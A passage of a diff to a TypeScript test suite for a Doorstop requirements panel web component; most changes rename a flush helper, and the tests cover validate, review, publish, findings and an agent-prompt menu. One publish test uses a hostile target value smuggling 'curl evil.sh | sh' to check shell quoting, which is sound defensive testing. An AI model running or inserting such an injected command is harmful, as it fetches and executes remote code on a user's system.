     git.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(git.body);
+    await flushMicro(git.body);
     expect(git.context.terminal.runCommand).toHaveBeenCalledWith({
       title: "Doorstop: validate",
       command: "doorstop",
@@ -1478,14 +1288,14 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
       provider: opendoorNoRequestProvider,
     });
     noRequest.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(noRequest.body);
+    await flushMicro(noRequest.body);
     expect(noRequest.context.terminal.runCommand).toHaveBeenCalled();
     expect(backendNoRequest).not.toHaveBeenCalled();
 
     // No backend at all (the default context): terminal path, nothing new.
     const unpaired = await mountBody(() => Promise.resolve(makeTreeResult()));
     unpaired.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(unpaired.body);
+    await flushMicro(unpaired.body);
     expect(unpaired.context.terminal.runCommand).toHaveBeenCalled();
     expect(unpaired.controller.lastRun).toBeUndefined();
     expect(unpaired.controller.runInProgress).toBeUndefined();
@@ -1502,9 +1312,9 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     // (the server owns argv construction; the browser never joins/quotes).
     body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-clear")?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(backend).toHaveBeenCalledWith("doorstop.run", {
       op: "clear",
       uid: "REQ0002",
@@ -1514,7 +1324,7 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     // Validate carries no arguments.
     backend.mockClear();
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(backend).toHaveBeenCalledWith("doorstop.run", { op: "validate" });
   });
 
@@ -1536,7 +1346,7 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     // Select REQ0002 so the action row renders (clear has one suspect there).
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     const buttons = [
       root.querySelector<HTMLButtonElement>(".doorstop-validate"),
@@ -1553,15 +1363,15 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     root.querySelector<HTMLElement>(".doorstop-validate")?.click();
     expect(controller.runInProgress).toBe("Doorstop: validate");
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     for (const button of buttons) expect(button?.disabled).toBe(true);
 
     // Landing the run re-enables them and clears the marker.
     resolveBackend(makeRunResponse());
-    await flush(body);
+    await flushMicro(body);
     expect(controller.runInProgress).toBeUndefined();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     for (const button of buttons) expect(button?.disabled).toBe(false);
   });
 
@@ -1573,9 +1383,9 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     });
 
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     // Auto-expanded: the output body is present without any user interaction.
     expect(body.shadowRoot?.querySelector(".doorstop-status-bar")).not.toBeNull();
     expect(body.shadowRoot?.querySelector(".doorstop-last-run")).not.toBeNull();
@@ -1585,7 +1395,7 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     await settle();
     expect(controller.lastRun).toBeDefined();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-status-bar")).not.toBeNull();
     expect(body.shadowRoot?.querySelector(".doorstop-last-run")).not.toBeNull();
 
@@ -1594,7 +1404,7 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-last-run-dismiss")?.click();
     expect(controller.lastRun).toBeUndefined();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-status-bar")).toBeNull();
     expect(body.shadowRoot?.querySelector(".doorstop-last-run")).toBeNull();
     expect(body.shadowRoot?.querySelector(".doorstop-last-run-dismiss")).toBeNull();
@@ -1609,22 +1419,22 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
 
     // Run 1 → auto-expanded.
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-last-run")).not.toBeNull();
 
     // Dismiss → run cleared, bar collapsed-away.
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-last-run-dismiss")?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-status-bar")).toBeNull();
 
     // Run 2 (a NEW run object with output) re-expands the bar automatically.
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-status-bar")).not.toBeNull();
     expect(body.shadowRoot?.querySelector(".doorstop-last-run")).not.toBeNull();
     expect(body.shadowRoot?.querySelector(".doorstop-last-run-pre")?.textContent).toContain(
@@ -1642,9 +1452,9 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     });
 
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const root = body.shadowRoot;
     // The status row is visible with no output body and no expand control.
     expect(root?.querySelector(".doorstop-status-bar")).not.toBeNull();
@@ -1671,9 +1481,9 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
       provider: opendoorProvider,
     });
     body.shadowRoot?.querySelector<HTMLElement>(".doorstop-validate")?.click();
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const root = body.shadowRoot;
     // The status bar row carries the killed badge and meta; the output body
     // auto-expands below it with the truncation notices.
@@ -1694,9 +1504,9 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     const off = await mountBody(() => Promise.resolve(makeEditedItemResult()), { backend: backendOff, provider: opendoorProvider });
     off.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(off.body, off.controller, off.context);
-    await flush(off.body);
+    await flushMicro(off.body);
     off.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
-    await flush(off.body);
+    await flushMicro(off.body);
     expect(backendOff).toHaveBeenCalledWith("doorstop.run", { op: "review", uid: "REQ0003" });
     // The no-`commit` guard is filtered to the `doorstop.run` calls: the
     // mount-time `doorstop.git-status` auto-fetch (Phase D step 14) is call
@@ -1711,17 +1521,17 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     const on = await mountBody(() => Promise.resolve(makeEditedItemResult()), { backend: backendOn, provider: opendoorProvider });
     on.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(on.body, on.controller, on.context);
-    await flush(on.body);
+    await flushMicro(on.body);
     // Flip the setting on the element's result surface (as a fresh settings
     // load would); bindBody above already mirrored the controller result, so
     // the override is what the Review click reads.
     const onResult = on.body.result;
     if (onResult !== undefined) {
       on.body.result = { ...onResult, settings: { ...onResult.settings, commitAfterReview: true } };
-      await flush(on.body);
+      await flushMicro(on.body);
     }
     on.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
-    await flush(on.body);
+    await flushMicro(on.body);
     expect(backendOn).toHaveBeenCalledWith("doorstop.run", { op: "review", uid: "REQ0003", commit: true });
 
     // Backend is the only commit path: with the setting on but NO backend,
@@ -1729,16 +1539,16 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     const terminal = await mountBody(() => Promise.resolve(makeEditedItemResult()));
     terminal.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(terminal.body, terminal.controller, terminal.context);
-    await flush(terminal.body);
+    await flushMicro(terminal.body);
     if (terminal.body.result !== undefined) {
       terminal.body.result = {
         ...terminal.body.result,
         settings: { ...terminal.body.result.settings, commitAfterReview: true },
       };
-      await flush(terminal.body);
+      await flushMicro(terminal.body);
     }
     terminal.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
-    await flush(terminal.body);
+    await flushMicro(terminal.body);
     expect(terminal.context.terminal.runCommand).toHaveBeenCalledWith({
       title: "Doorstop: review REQ0003",
       command: "doorstop review REQ0003",
@@ -1762,11 +1572,11 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     const good = await mountBody(() => Promise.resolve(makeEditedItemResult()), { backend, provider: opendoorProvider });
     good.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(good.body, good.controller, good.context);
-    await flush(good.body);
+    await flushMicro(good.body);
     good.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
-    await flush(good.body);
+    await flushMicro(good.body);
     bindBody(good.body, good.controller, good.context);
-    await flush(good.body);
+    await flushMicro(good.body);
     const goodRoot = good.body.shadowRoot;
     expect(goodRoot?.querySelector(".doorstop-status-bar")).not.toBeNull();
     expect(goodRoot?.querySelector(".doorstop-last-run")).not.toBeNull();
@@ -1788,11 +1598,11 @@ describe("DoorstopPanelBodyElement (backend path + last run, Phase D)", () => {
     const failed = await mountBody(() => Promise.resolve(makeEditedItemResult()), { backend: backendFailed, provider: opendoorProvider });
     failed.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(failed.body, failed.controller, failed.context);
-    await flush(failed.body);
+    await flushMicro(failed.body);
     failed.body.shadowRoot?.querySelector<HTMLElement>(".doorstop-review")?.click();
-    await flush(failed.body);
+    await flushMicro(failed.body);
     bindBody(failed.body, failed.controller, failed.context);
-    await flush(failed.body);
+    await flushMicro(failed.body);
     const failedRoot = failed.body.shadowRoot;
     expect(failedRoot?.querySelector(".doorstop-status-bar")).not.toBeNull();
     expect(failedRoot?.querySelector(".doorstop-last-run")).not.toBeNull();
@@ -1843,14 +1653,14 @@ describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
     });
     reviewedCase.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
     bindBody(reviewedCase.body, reviewedCase.controller, reviewedCase.context);
-    await flush(reviewedCase.body);
+    await flushMicro(reviewedCase.body);
     expect(reviewedCase.body.shadowRoot?.querySelector(".doorstop-changes")).toBeNull();
 
     // Unreviewed WITH a stored fingerprint and an active backend: present.
     const unpaired = await mountBody(() => Promise.resolve(makeEditedItemResult()));
     unpaired.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(unpaired.body, unpaired.controller, unpaired.context);
-    await flush(unpaired.body);
+    await flushMicro(unpaired.body);
     // No backend (unpaired install): the section is hidden entirely.
     expect(unpaired.body.shadowRoot?.querySelector(".doorstop-changes")).toBeNull();
 
@@ -1861,7 +1671,7 @@ describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
     });
     paired.body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(paired.body, paired.controller, paired.context);
-    await flush(paired.body);
+    await flushMicro(paired.body);
     const section = paired.body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
     expect(section).not.toBeNull();
     expect(section?.open).toBe(false); // collapsed by default
@@ -1881,13 +1691,13 @@ describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
     });
     body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     const details = body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
     if (details === undefined || details === null) throw new Error("no changes section");
     details.open = true;
     details.dispatchEvent(new Event("toggle"));
-    await flush(body);
+    await flushMicro(body);
     // One fetch with the exact request (uid + workspace-relative path).
     const baselineCalls = backend.mock.calls.filter(([op]) => op === "doorstop.item-baseline");
     expect(baselineCalls).toHaveLength(1);
@@ -1899,12 +1709,14 @@ describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
     details.dispatchEvent(new Event("toggle"));
     details.open = true;
     details.dispatchEvent(new Event("toggle"));
-    await flush(body);
+    await flushMicro(body);
     expect(backend.mock.calls.filter(([op]) => op === "doorstop.item-baseline")).toHaveLength(1);
   });
 
   it("stamp-walks the candidates newest-first and renders the semantic diff (text rows + field chips)", async () => {
-    const oldVersion = makeItem("REQ0003", "REQ", {
+    const oldVersion = makeItem({
+      uid: "REQ0003",
+      documentPrefix: "REQ",
       path: "reqs/REQ0003.yml",
       level: "1.2",
       text: "The system shall do Z.\nAnd approve.",
@@ -1934,14 +1746,14 @@ describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
     });
     body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const details = body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
     if (details === undefined || details === null) throw new Error("no changes section");
     details.open = true;
     details.dispatchEvent(new Event("toggle"));
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     const root = body.shadowRoot;
     const sectionText = root?.querySelector(".doorstop-changes")?.textContent ?? "";
@@ -1977,14 +1789,14 @@ describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
     });
     body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const details = body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
     if (details === undefined || details === null) throw new Error("no changes section");
     details.open = true;
     details.dispatchEvent(new Event("toggle"));
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-changes-notice")?.textContent).toBe(
       "Could not locate the reviewed version (history may have been rewritten)",
     );
@@ -2003,14 +1815,14 @@ describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
     });
     body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const details = body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
     if (details === undefined || details === null) throw new Error("no changes section");
     details.open = true;
     details.dispatchEvent(new Event("toggle"));
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-changes-notice")?.textContent).toBe(
       "No git history — previous version unavailable",
     );
@@ -2029,14 +1841,14 @@ describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
     });
     body.shadowRoot?.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0003"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const details = body.shadowRoot?.querySelector<HTMLDetailsElement>(".doorstop-changes");
     if (details === undefined || details === null) throw new Error("no changes section");
     details.open = true;
     details.dispatchEvent(new Event("toggle"));
-    await flush(body);
+    await flushMicro(body);
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     // The no-match view is cached under REQ0003's current key.
     expect(backend.mock.calls.filter(([op]) => op === "doorstop.item-baseline")).toHaveLength(1);
     expect(body.shadowRoot?.querySelector(".doorstop-changes-notice")?.textContent).toContain(
@@ -2053,7 +1865,7 @@ describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
     item.text += "\nEdited after review.";
     bindBody(body, controller, context);
     body.result = { ...controller.result! };
-    await flush(body);
+    await flushMicro(body);
     // Still open (node reused, not recreated) — and the fetch happened with
     // no user action at all.
     expect(details.open).toBe(true);
@@ -2061,7 +1873,7 @@ describe("DoorstopPanelBodyElement (changes since review, Phase D)", () => {
     // Mirror the landing (the refetch bumped `baselineVersion`) so the
     // element re-renders the terminal notice instead of the loading view.
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(body.shadowRoot?.querySelector(".doorstop-changes-notice")?.textContent).toContain(
       "Could not locate",
     );
@@ -2087,7 +1899,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
     expect(findingsTab?.getAttribute("aria-selected")).toBe("false");
     expect(itemsTab?.getAttribute("aria-selected")).toBe("true");
     findingsTab?.click();
-    await flush(body);
+    await flushMicro(body);
 
     // Findings view replaces the item layout; docs/filters/search hide;
     // the terminal actions stay reachable in both views.
@@ -2104,7 +1916,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
 
     // Back to items.
     itemsTab?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-item-row")).not.toBeNull();
     expect(root.querySelector(".doorstop-findings-view")).toBeNull();
     expect(itemsTab?.getAttribute("aria-selected")).toBe("true");
@@ -2122,7 +1934,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
     controller.setStateFilter("suspect-link");
     controller.setSearch("REQ0002");
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     let select = root.querySelector<HTMLSelectElement>(".doorstop-state-filter");
     let search = root.querySelector<HTMLInputElement>(".doorstop-search");
     expect(select?.value).toBe("suspect-link");
@@ -2131,7 +1943,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
 
     // The findings view removes the items-only controls entirely…
     root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-state-filter")).toBeNull();
     expect(root.querySelector(".doorstop-search")).toBeNull();
     expect(root.querySelector(".doorstop-doc-chip")).toBeNull();
@@ -2144,7 +1956,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
     // controls, the controls that happy-dom reflects faithfully, and that
     // the re-created <select> is wired to the preserved value.
     root.querySelector<HTMLElement>(".doorstop-view-items")?.click();
-    await flush(body);
+    await flushMicro(body);
     select = root.querySelector<HTMLSelectElement>(".doorstop-state-filter");
     search = root.querySelector<HTMLInputElement>(".doorstop-search");
     expect(body.stateFilter).toBe("suspect-link");
@@ -2178,7 +1990,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
     const root = body.shadowRoot;
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
-    await flush(body);
+    await flushMicro(body);
 
     const rows = [...(root.querySelectorAll(".doorstop-finding-row") ?? [])];
     const messages = rows.map((row) => row.querySelector(".doorstop-finding-message")?.textContent);
@@ -2221,7 +2033,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
     const root = body.shadowRoot;
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
-    await flush(body);
+    await flushMicro(body);
 
     // REQ9999 is not in index.byUid → the row renders the inert half of the
     // "clickable only when the uid exists" rule: a plain <code>, not the
@@ -2244,7 +2056,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
     const root = body.shadowRoot;
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
-    await flush(body);
+    await flushMicro(body);
 
     const counts = root.querySelector(".doorstop-findings-counts");
     expect(counts?.textContent).toBe("1 error · 3 warnings · 3 info");
@@ -2266,12 +2078,12 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
     controller.setStateFilter("suspect-link");
     controller.setSearch("verify");
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector('.doorstop-item-row[data-uid="TST001"]')).toBeNull();
 
     // Switch to findings and click TST001's UID row.
     root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
-    await flush(body);
+    await flushMicro(body);
     const uidButton = root.querySelector<HTMLElement>('.doorstop-finding-uid[data-uid="TST001"]');
     expect(uidButton).not.toBeNull();
     uidButton?.click();
@@ -2282,7 +2094,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
     expect(controller.search).toBe("");
     expect(controller.selectedUid).toBe("TST001");
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector<HTMLElement>(".doorstop-view-items")?.getAttribute("aria-selected")).toBe("true");
     expect(root.querySelector('.doorstop-item-row[data-uid="TST001"]')).not.toBeNull();
     expect(root.querySelector(".doorstop-detail-pane")?.textContent).toContain("TST001");
@@ -2290,7 +2102,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
 
   it("shows the clean-tree empty state with the plugin-local hint when there are no findings", async () => {
     const reqConfig = makeDocument();
-    const req0001 = makeItem("REQ0001", "REQ", { path: "reqs/REQ0001.yml", text: "The system shall do X." });
+    const req0001 = makeItem({ uid: "REQ0001", documentPrefix: "REQ", path: "reqs/REQ0001.yml", text: "The system shall do X." });
     // Reviewed against the current fingerprint → no state findings at all.
     req0001.reviewed = computeItemStamp(req0001, reqConfig, true);
     const result = makeResult([req0001], [reqConfig], []);
@@ -2298,7 +2110,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
     const root = body.shadowRoot;
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
-    await flush(body);
+    await flushMicro(body);
 
     const empty = root.querySelector(".doorstop-findings-view .doorstop-empty");
     expect(empty?.textContent).toContain(FINDINGS_EMPTY_MESSAGE);
@@ -2313,7 +2125,7 @@ describe("DoorstopPanelBodyElement (findings view, spec §7.2)", () => {
     const root = body.shadowRoot;
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>(".doorstop-view-findings")?.click();
-    await flush(body);
+    await flushMicro(body);
     root.querySelector<HTMLElement>(".doorstop-validate")?.click();
     await settle();
     expect(context.terminal.runCommand).toHaveBeenCalledWith({
@@ -2344,7 +2156,7 @@ describe("DoorstopPanelBodyElement (publish target wiring, spec §7.2)", () => {
     // Promise.resolve result — give it room to land before asserting.
     for (let turn = 0; turn < 50; turn += 1) await Promise.resolve();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     const result = body.result;
     if (result === undefined) throw new Error("no result");
     expect(result.settings.publishTarget).toBe("./site");
@@ -2376,7 +2188,7 @@ describe("DoorstopPanelBodyElement (publish target wiring, spec §7.2)", () => {
     const bare = body.result;
     if (bare === undefined) throw new Error("no result");
     body.result = { index: bare.index } as DoorstopWorkspaceResult;
-    await flush(body);
+    await flushMicro(body);
     expect(doorstopPublishTarget(body.result)).toBe(DEFAULT_OPENDOOR_SETTINGS.publishTarget);
     expect(doorstopPublishCommand(body.result)).toBe("doorstop publish all ./public");
 
@@ -2393,7 +2205,7 @@ describe("DoorstopPanelBodyElement (publish target wiring, spec §7.2)", () => {
     // With NO result at all the fallback still applies (default target).
     vi.mocked(context.terminal.runCommand).mockClear();
     body.result = undefined;
-    await flush(body);
+    await flushMicro(body);
     expect(doorstopPublishTarget(undefined)).toBe(DEFAULT_OPENDOOR_SETTINGS.publishTarget);
     root.querySelector<HTMLElement>(".doorstop-publish")?.click();
     await settle();
@@ -2418,7 +2230,7 @@ describe("DoorstopPanelBodyElement (publish target wiring, spec §7.2)", () => {
     const bare = body.result;
     if (bare === undefined) throw new Error("no result");
     body.result = { index: bare.index, settings: { publishTarget: hostile, excludedDirectories: [], commitAfterReview: false } };
-    await flush(body);
+    await flushMicro(body);
     expect(doorstopPublishTarget(body.result)).toBe(hostile);
     expect(doorstopPublishCommand(body.result)).toBe("doorstop publish all './public; curl evil.sh | sh'");
 
@@ -2485,7 +2297,7 @@ describe("DoorstopPanelBodyElement (Ask-agent menu)", () => {
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     const result = controller.result;
     if (result === undefined) throw new Error("result");
@@ -2496,7 +2308,7 @@ describe("DoorstopPanelBodyElement (Ask-agent menu)", () => {
     // The menu is closed by default; the toggle opens it.
     expect(root.querySelector(".doorstop-menu-items")).toBeNull();
     root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
-    await flush(body);
+    await flushMicro(body);
     const items = root.querySelector(".doorstop-menu-items");
     if (items === null) throw new Error("menu");
 
@@ -2504,22 +2316,22 @@ describe("DoorstopPanelBodyElement (Ask-agent menu)", () => {
     expect(insertText).toHaveBeenLastCalledWith(explainItemPrompt(req0002));
     expect(focusPrompt).toHaveBeenCalled();
     // Selecting a prompt closes the menu after the insert commits.
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-menu-items")).toBeNull(); // closes after insert
 
     // Fix suspect links names the changed parents.
     root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
-    await flush(body);
+    await flushMicro(body);
     root.querySelector<HTMLElement>(".doorstop-fix-suspects")?.click();
     expect(insertText).toHaveBeenLastCalledWith(fixSuspectLinksPrompt(req0002, [req0001]));
     // Draft child targets the item's first child document prefix (TST).
     root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
-    await flush(body);
+    await flushMicro(body);
     root.querySelector<HTMLElement>(".doorstop-draft-child")?.click();
     expect(insertText).toHaveBeenLastCalledWith(draftChildRequirementPrompt(req0002, "TST"));
     // Review readiness names the children resolved from the reverse map.
     root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
-    await flush(body);
+    await flushMicro(body);
     root.querySelector<HTMLElement>(".doorstop-review-readiness")?.click();
     const children = result.index.childrenByUid.get(req0002.uid) ?? [];
     expect(insertText).toHaveBeenLastCalledWith(reviewReadinessPrompt(req0002, children));
@@ -2533,10 +2345,10 @@ describe("DoorstopPanelBodyElement (Ask-agent menu)", () => {
     // TST001: no links → no suspects; TST document has no children → no child prefix.
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="TST001"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
-    await flush(body);
+    await flushMicro(body);
     const fix = root.querySelector<HTMLButtonElement>(".doorstop-fix-suspects");
     const draft = root.querySelector<HTMLButtonElement>(".doorstop-draft-child");
     expect(fix?.disabled).toBe(true);
@@ -2558,7 +2370,7 @@ describe("DoorstopPanelBodyElement (Ask-agent menu)", () => {
     // name that child UID, not an empty list.
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0001"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     const result = controller.result;
     if (result === undefined) throw new Error("result");
@@ -2568,7 +2380,7 @@ describe("DoorstopPanelBodyElement (Ask-agent menu)", () => {
     expect(children.map((child) => child.uid)).toContain("TST002");
 
     root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
-    await flush(body);
+    await flushMicro(body);
     root.querySelector<HTMLElement>(".doorstop-review-readiness")?.click();
     const prompt = reviewReadinessPrompt(req0001, children);
     expect(insertText).toHaveBeenLastCalledWith(prompt);
@@ -2581,31 +2393,31 @@ describe("DoorstopPanelBodyElement (Ask-agent menu)", () => {
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
 
     // Open, then Escape closes it.
     root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-menu-items")).not.toBeNull();
     document.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-menu-items")).toBeNull();
 
     // Open, then an outside click closes it.
     root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-menu-items")).not.toBeNull();
     document.body.dispatchEvent(new MouseEvent("click", { bubbles: true }));
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-menu-items")).toBeNull();
 
     // Open, then selecting a different item closes it.
     root.querySelector<HTMLElement>(".doorstop-menu-toggle")?.click();
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-menu-items")).not.toBeNull();
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="TST001"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
     expect(root.querySelector(".doorstop-menu-items")).toBeNull();
   });
 
@@ -2615,12 +2427,12 @@ describe("DoorstopPanelBodyElement (Ask-agent menu)", () => {
     if (root === null) throw new Error("shadow root");
     root.querySelector<HTMLElement>('.doorstop-item-row[data-uid="REQ0002"]')?.click();
     bindBody(body, controller, context);
-    await flush(body);
+    await flushMicro(body);
